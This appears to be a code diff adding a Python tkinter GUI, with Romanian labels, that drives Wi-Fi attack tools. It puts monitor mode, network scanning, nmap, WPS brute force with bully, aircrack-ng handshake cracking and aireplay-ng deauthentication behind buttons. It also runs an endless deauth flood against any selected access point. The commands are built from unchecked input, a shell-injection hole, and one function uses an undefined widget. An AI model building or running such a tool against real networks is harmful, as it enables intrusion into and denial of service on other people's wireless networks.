@@ -1,0 +1,132 @@
+import os
+import tkinter as tk
+from tkinter import messagebox, filedialog, scrolledtext
+from threading import Thread
+
+def start_monitor():
+    interface = interface_entry.get()
+    if interface:
+        os.system(f"airmon-ng start {interface}")
+        Thread(target=scan_wifi, args=(interface,)).start()
+    else:
+        messagebox.showerror("eroare", "introdu o interfata valida.")
+
+def stop_monitor():
+    interface = interface_entry.get()
+    if interface:
+        os.system(f"airmon-ng stop {interface}")
+        wifi_listbox.delete(0, tk.END)
+    else:
+        messagebox.showerror("eroare", "introdu o interfata valida.")
+
+def scan_wifi(interface):
+    wifi_listbox.delete(0, tk.END)
+    os.system(f"timeout 5 airodump-ng {interface} -w /tmp/networks --output-format csv")
+    try:
+        with open("/tmp/networks-01.csv", "r") as file:
+            for line in file.readlines()[2:]:
+                if line.strip() and len(line.split(',')) > 13:
+                    bssid, channel, essid = line.split(',')[0].strip(), line.split(',')[3].strip(), line.split(',')[13].strip()
+                    wifi_listbox.insert(tk.END, f"{essid} ({bssid}) - canal {channel}")
+    except FileNotFoundError:
+        messagebox.showerror("eroare", "nu s-au putut scana retelele.")
+
+def select_wifi(event):
+    selection = wifi_listbox.get(wifi_listbox.curselection())
+    bssid, essid = selection.split("(")[1].split(")")[0], selection.split(" ")[0]
+    selected_bssid.set(bssid)
+    selected_essid.set(essid)
+    result_display.insert(tk.END, f"[info] selectat: {essid} | bssid: {bssid}\n")
+
+def execute_command(command):
+    result_display.insert(tk.END, f"[exec] {command}\n")
+    result_display.insert(tk.END, os.popen(command).read())
+
+def scan_nmap():
+    target = target_entry.get()
+    if target:
+        execute_command(f"nmap -A {target}")
+    else:
+        messagebox.showerror("eroare", "introdu o tinta valida pentru scanare.")
+
+def brute_force_wps():
+    bssid = selected_bssid.get()
+    if bssid:
+        execute_command(f"bully -b {bssid} -c {channel_entry.get()} -v")
+    else:
+        messagebox.showerror("eroare", "selecteaza un bssid valid pentru atac wps.")
+
+def crack_handshake():
+    cap_file = filedialog.askopenfilename(filetypes=[("fisiere captura", "*.cap")])
+    wordlist = filedialog.askopenfilename(filetypes=[("fisiere text", "*.txt")])
+    if cap_file and wordlist:
+        execute_command(f"aircrack-ng -w {wordlist} {cap_file}")
+    else:
+        messagebox.showerror("eroare", "selecteaza fisierul captura si wordlist-ul.")
+
+def attack_deauth():
+    bssid = selected_bssid.get()
+    if bssid:
+        execute_command(f"aireplay-ng --deauth 10 -a {bssid} {interface_entry.get()}")
+    else:
+        messagebox.showerror("eroare", "selecteaza un bssid valid pentru atac deauth.")
+
+def deauth_flood():
+    bssid = selected_bssid.get()
+    interface = interface_entry.get()
+    if bssid and interface:
+        result_display.insert(tk.END, "[info] atac deauth flood continuu lansat...\n")
+        flood_thread = Thread(target=continuous_deauth, args=(bssid, interface))
+        flood_thread.daemon = True
+        flood_thread.start()
+    else:
+        messagebox.showerror("eroare", "selecteaza un bssid si o interfata valida pentru atac.")
+
+def continuous_deauth(bssid, interface):
+    try:
+        while True:
+            os.system(f"aireplay-ng --deauth 1000 -a {bssid} {interface}")
+    except KeyboardInterrupt:
+        result_display.insert(tk.END, "[info] atac deauth flood oprit.\n")
+
+root = tk.Tk()
+root.title("penetration testing complex - gui")
+root.geometry("1200x700")
+root.configure(bg="black")
+
+left_frame = tk.Frame(root, bg="black")
+left_frame.place(x=20, y=20, width=350, height=660)
+
+tk.Label(left_frame, text="interfata wi-fi:", bg="black", fg="green").pack(pady=5)
+interface_entry = tk.Entry(left_frame, bg="gray", fg="green")
+interface_entry.pack(pady=5)
+
+tk.Button(left_frame, text="porneste monitor mode", command=start_monitor, bg="gray", fg="green").pack(pady=5)
+tk.Button(left_frame, text="opreste monitor mode", command=stop_monitor, bg="gray", fg="green").pack(pady=5)
+
+tk.Label(left_frame, text="retele disponibile:", bg="black", fg="green").pack(pady=5)
+wifi_listbox = tk.Listbox(left_frame, bg="black", fg="green", width=50, height=25)
+wifi_listbox.pack(pady=5)
+wifi_listbox.bind("<<ListboxSelect>>", select_wifi)
+
+selected_bssid = tk.StringVar()
+selected_essid = tk.StringVar()
+
+right_frame = tk.Frame(root, bg="black")
+right_frame.place(x=400, y=20, width=770, height=660)
+
+result_display = scrolledtext.ScrolledText(right_frame, bg="black", fg="green", width=92, height=25)
+result_display.pack(pady=10)
+
+tk.Label(right_frame, text="tinta scanare:", bg="black", fg="green").pack(pady=5)
+target_entry = tk.Entry(right_frame, bg="gray", fg="green")
+target_entry.pack(pady=5)
+
+button_config = {"bg": "gray", "fg": "green", "width": 30, "pady": 5}
+tk.Button(right_frame, text="scanare nmap", command=scan_nmap, **button_config).pack()
+tk.Button(right_frame, text="brute-force wps", command=brute_force_wps, **button_config).pack()
+tk.Button(right_frame, text="sparge handshake", command=crack_handshake, **button_config).pack()
+tk.Button(right_frame, text="atac deauth", command=attack_deauth, **button_config).pack()
+tk.Button(right_frame, text="deauth flood continuu", command=deauth_flood, **button_config).pack()
+
+root.mainloop()
